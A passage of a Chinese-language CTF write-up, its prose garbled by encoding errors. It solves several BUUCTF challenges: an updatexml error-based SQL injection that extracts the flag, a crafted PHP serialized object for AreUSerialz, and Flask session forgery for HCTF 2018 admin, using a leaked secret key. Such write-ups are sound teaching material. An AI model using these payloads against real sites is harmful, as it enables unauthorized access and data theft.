<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">left</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆè¿™é‡Œleftå‡½æ•°æ˜¾ç¤º30ä¸ªå­—ç¬¦ï¼Œå› ä¸º0x7eä¹Ÿå°±æ˜¯<del>ä¹Ÿæ˜¯å­—ç¬¦ï¼Œ</del>å·²ç»å äº†ä¸¤ä½ï¼Œæ‰€ä»¥è¿˜å¯ä»¥æ˜¾ç¤º30ä½</p>
<p><img src="/post/wp-buuctf/image-20220821220007687.png" alt="image-20220821220007687"></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220821220041922.png" alt="image-20220821220041922"></p>
<p>å› ä¸ºæ˜¯å·¦å³æ˜¾ç¤º30ä½ï¼Œæ‰€ä»¥flagå†…å®¹æœ‰é‡å ï¼Œæ•´ç†ä¸€ä¸‹</p>
<p>å¾—åˆ°flag</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">034eb054</span>-<span class="number">83b5</span>-412c-b90e-afc72c6ce998&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz1"><a href="#6-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz1" class="headerlink" title="6.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1"></a>6.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1</h2><p>1)é¢˜ç›®æè¿°</p>
<p>æ— </p>
<p>2)wp</p>
<p>ä¸€é“å…¸å‹çš„åºåˆ—åŒ–é¢˜ç›®</p>
<p>å…ˆå¯¹ä»£ç è¿›è¡Œåˆ†æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__construct()å‡½æ•°æ²¡æœ‰ç”¨ï¼Œä¸å‚ä¸åºåˆ—åŒ–ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚</span></span><br><span class="line"><span class="comment">// ASCIIå€¼32ä¸º2ï¼ŒASCIIå€¼125ä¸º%</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯è¿‡æ»¤æ‰protectç±»çš„æˆå‘˜,åœ¨åºåˆ—åŒ–çš„æ—¶å€™æ˜¯ä»¥%00ä½œä¸ºæ ‡è¯†ç¬¦</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">*ä½†æ˜¯åœ¨PHPç‰ˆæœ¬å¤§äº<span class="number">7.1</span>çš„æƒ…å†µä¸‹ï¼Œ<span class="keyword">protect</span>ç±»å’Œ<span class="keyword">public</span>ç±»æ²¡ä»€ä¹ˆå¥½æ³¨æ„çš„ï¼Œæ‰€ä»¥åœ¨æ„é€ åºåˆ—åŒ–æ—¶æ”¹ä¸º<span class="keyword">public</span>å¯ä»¥ç»•è¿‡is_validå‡½æ•°</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__destruc()å‡½æ•°ä¸»è¦æ˜¯ä¸è®©<code>op===&quot;2&quot;</code>ï¼Œä½†æ˜¯åœ¨processå‡½æ•°é‡Œopåˆè¦ä¸ºâ€œ2â€</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥è¿™é‡Œåˆ©ç”¨å¼ºå¼±ç±»å‹æ¯”è¾ƒï¼Œ__destruc()å‡½æ•°é‡Œopæ˜¯ä¸èƒ½ä¸º2ï¼Œä½†æ˜¯æ˜¯å¼ºç±»å‹æ¯”è¾ƒï¼Œæ˜¯å­—ç¬¦2ã€â€2â€ã€‘,æ‰€ä»¥op&#x3D;2ã€æ•°å­—2ã€‘ï¼Œå°±ç»•è¿‡è¾¾åˆ°è¯»å–flag.phpçš„ç»“æœ</p>
<p>äºæ˜¯æ„é€ å‡ºphpåºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åºåˆ—åŒ–ç»“æœ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>ï¼š&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>è®¿é—®ï¼ŒF12æŸ¥çœ‹ã€æˆ–è€…æ”¹ä¸€ä¸‹filenameçš„å€¼ä¸ºphp:&#x2F;&#x2F;filterä¼ªåè®®ï¼Œç”¨base64ï¼Œå¯ä»¥ç›´æ¥çœ‹åˆ°ã€‘</p>
<p><code>http://f20b2545-8ff3-4a33-887f-27f4901db96a.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
<p>å¾—åˆ°flag</p>
<p><img src="/post/wp-buuctf/image-20220822135717175.png" alt="image-20220822135717175"></p>
<h2 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h2><h3 id="1-é¢˜ç›®æè¿°-4"><a href="#1-é¢˜ç›®æè¿°-4" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜å¼€å§‹å½“ä½œå¼±å¯†ç é¢˜è§£ï¼Œç»“æœç›´æ¥çˆ†ç ´å‡ºæ¥äº†</p>
<p>ç”¨æˆ·åï¼šadmin</p>
<p>å¯†ç ï¼š123</p>
<p>è¿™æ ·åº”è¯¥æœ€ç®€å•çš„æ–¹æ³•äº†</p>
<p>ä½†æˆ‘çœ‹äº†çœ‹å…¶ä»–å¤§ä½¬wpï¼Œä»–ä»¬æŠŠè¿™ä¸ªå½“ä½œflask_sessionä¼ªé€ çš„é¢˜ç›®</p>
<p>å­¦ä¹ ä¸€ä¸‹</p>
<p>å…ˆæ³¨å†Œä¸€ä¸ªè¯•è¯•</p>
<p>ç”¨æˆ·åï¼šadmin123</p>
<p>å¯†ç ï¼š123456</p>
<p><img src="/post/wp-buuctf/image-20220822203857056.png" alt="image-20220822203857056"></p>
<p>åªåœ¨<code>change password</code>çš„æºç çœ‹åˆ°çº¿ç´¢ï¼ŒçŸ¥é“æ˜¯flaskæ¡†æ¶</p>
<p><img src="/post/wp-buuctf/image-20220822203848108.png" alt="image-20220822203848108"></p>
<p>è®¿é—®ä¸‹è½½æ–‡ä»¶</p>
<p>flaskå­˜åœ¨ä¸€ä¸ªsessionä¼ªé€ æ¼æ´</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">flaskçš„<span class="keyword">session</span>ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œä¸€èˆ¬åªæ˜¯åŠ äº†ç­¾åæ¥é˜²æ­¢è¢«æˆªå–ä¿®æ”¹ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰åŠ å¯†æˆ‘ä»¬å°±å¯ä»¥å¯¹<span class="keyword">session</span>è¿›è¡Œè§£ç æ¥è·å–å…¶ä¸­çš„ç”¨æˆ·æ•°æ®ã€‚ </span><br><span class="line"></span><br><span class="line">å¦‚æœæˆ‘ä»¬åœ¨è·å–åˆ°ç­¾åçš„ç§˜é’¥ï¼Œå°±å¯ä»¥æŒ‰ç…§è§£ç å‡ºæ¥çš„æ•°æ®è¿›è¡Œä¼ªé€ ï¼Œé‡æ–°ç”Ÿæˆç­¾åçš„<span class="keyword">session</span>æ¥è¾¾åˆ°æ¬ºéª—æœåŠ¡ç«¯ã€‚  </span><br><span class="line"></span><br><span class="line">flaskçš„<span class="keyword">session</span>ä½¿ç”¨base64å¯¹bytesç±»å‹çš„ç”¨æˆ·æ•°æ®è¿›è¡Œç¼–ç ï¼Œè€Œä¸”ç¼–ç ä¹‹å‰å¯èƒ½è¿›è¡Œäº†å‹ç¼©(<span class="keyword">session</span>ä»¥ &quot;.&quot;  å¼€å¤´æ—¶è¡¨ç¤ºè¿›è¡Œäº†å‹ç¼©) flask ä¿å­˜åœ¨cookieé‡Œé¢çš„<span class="keyword">session</span>ä¸€èˆ¬æ ¼å¼ä¸º data.timestamp.signature</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„sessionæ²¡æœ‰åŠ å¯†ï¼Œåœ¨config.pyä¸­å¾—åˆ°äº†ç­¾åç§˜é’¥<code>ckj123</code>ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é‡æ–°ç”Ÿæˆsessionï¼Œæ¥æ¬ºéª—æœåŠ¡å™¨</p>
<p><img src="/post/wp-buuctf/image-20220822204409898.png" alt="image-20220822204409898"></p>
<p>åˆ©ç”¨cookie editoræŸ¥çœ‹sessionå€¼</p>
<p><img src="/post/wp-buuctf/image-20220822231718091.png" alt="image-20220822231718091"></p>
<p>ç„¶åå†æ‰¾å‘ç°index.htmlä¸‹æœ‰flagæç¤º</p>
<p><img src="/post/wp-buuctf/image-20220823000533344.png" alt="image-20220823000533344"></p>
<p>ç®€å•åˆ†æä¸€ä¸‹ï¼Œå°±æ˜¯è®©sessioné‡Œçš„name&#x3D;&#x3D;â€adminâ€</p>
<p>æ‰€ä»¥è¿™é‡Œå°±éœ€è¦ä¿®æ”¹ä¸€ä¸‹æˆ‘ä»¬å¾—åˆ°çš„session</p>
<p>è¿™é‡Œå»ºè®®äº†è§£ä¸€ä¸‹ä¸€ä¸ªå·¥å…·<code>flask-session-cookie-manager-master</code>èƒ½å¯¹å…¶è¿›è¡ŒåŠ å¯†è§£ç ã€å¯èƒ½éœ€è¦pipä¸‹ä¸€äº›æ¨¡å—ï¼Œç™¾åº¦å¯ä»¥è§£å†³ã€‘</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">è§£å¯†</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> decode -s â€œcxk123â€ -<span class="keyword">c</span> â€œä½ åœ¨<span class="keyword">change</span>é¡µé¢çš„sessionå€¼â€</span><br><span class="line">åŠ å¯†</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> encode -s â€œcxk123â€ -t â€œæŒ‰ç…§å¾—åˆ°è§£å¯†ç»“æœæ ¼å¼æ”¹çš„ç»“æœâ€</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220822235758750.png" alt="image-20220822235758750"></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line"></span><br><span class="line">æŠŠæˆ‘ä»¬çš„ç”¨æˆ·åæ”¹ä¸ºadmin</span><br><span class="line"></span><br><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†åŠ å¯†</p>
<p><img src="/post/wp-buuctf/image-20220823000020825.png" alt="image-20220823000020825"></p>
<p>ç„¶åcookie editorä¿®æ”¹ä¸ºæˆ‘ä»¬åŠ å¯†ç»“æœ</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">.eJxFUMtu<span class="name">g0</span>AM_JXK<span class="number">5</span>xx<span class="number">4</span>tBekHCKRIiqtEWgJ<span class="number">8</span>l<span class="number">4</span>iGkjAy<span class="number">1</span>IJWlE<span class="number">2</span>yr<span class="number">93</span><span class="name">m1</span>bKwQd<span class="number">7</span>xvbMXOF<span class="number">4</span><span class="symbol">ntq5</span>g-hcD<span class="number">3</span><span class="meta">O7</span>gWPfQHSFp<span class="number">3</span>eIgPhiSTYsuDM<span class="meta">o956</span>KRaiq<span class="number">3</span>KJEQ<span class="number">9</span>xpFR<span class="number">-6</span>LFEDmfwZ<span class="number">7</span>c<span class="number">6</span>SPfRZkq<span class="number">4</span>qzhfi<span class="number">0</span>vF<span class="number">-528</span>sJDpuboUsmAI<span class="number">0</span>mdx_<span class="meta">o8</span>lXlaBGLl-yuBmwouVvV<span class="number">7</span>EySis-rRSkITItZF<span class="number">4</span>H<span class="number">4</span>kZjVYbus<span class="number">6</span>VKrBiTT<span class="number">1</span>L<span class="number">7</span>rl<span class="number">9</span>EQFu<span class="number">4</span>beA<span class="number">0</span>T-fj<span class="number">54</span>dux<span class="number">4</span>cFq<span class="number">0</span>OsUifFVZKGwkkTcuBMFp<span class="number">2</span>T<span class="number">0</span>otEOWvFgPbkOTkdVWWQ<span class="number">7</span>bb<span class="number">3</span>c<span class="number">72</span>pL<span class="number">-3</span>jUuhC-Ef<span class="name">G2</span>jgA<span class="number">6</span>sb<span class="number">0</span>I<span class="number">2</span>zga<span class="number">26</span><span class="symbol">ne27</span><span class="keyword">ge</span><span class="number">3</span>D<span class="number">7</span>AeD<span class="number">4</span>b<span class="number">34.</span>YwOoDA.quyfjg-Miz<span class="number">9</span>Y<span class="number">5</span>cx<span class="number">6</span>i<span class="number">5</span>hTVr<span class="number">0</span>EWjE</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220823000303547.png" alt="image-20220823000303547"></p>
<p>å¾—åˆ°flag</p>
<h2 id="8-ZJCTF-2019-NiZhuanSiWei"><a href="#8-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="8.[ZJCTF 2019]NiZhuanSiWei"></a>8.[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="1-é¢˜ç›®æè¿°-5"><a href="#1-é¢˜ç›®æè¿°-5" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆåˆ†æä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>)<span class="comment">//rä¸ºè¯»å–æƒé™</span></span><br></pre></td></tr></table></figure>

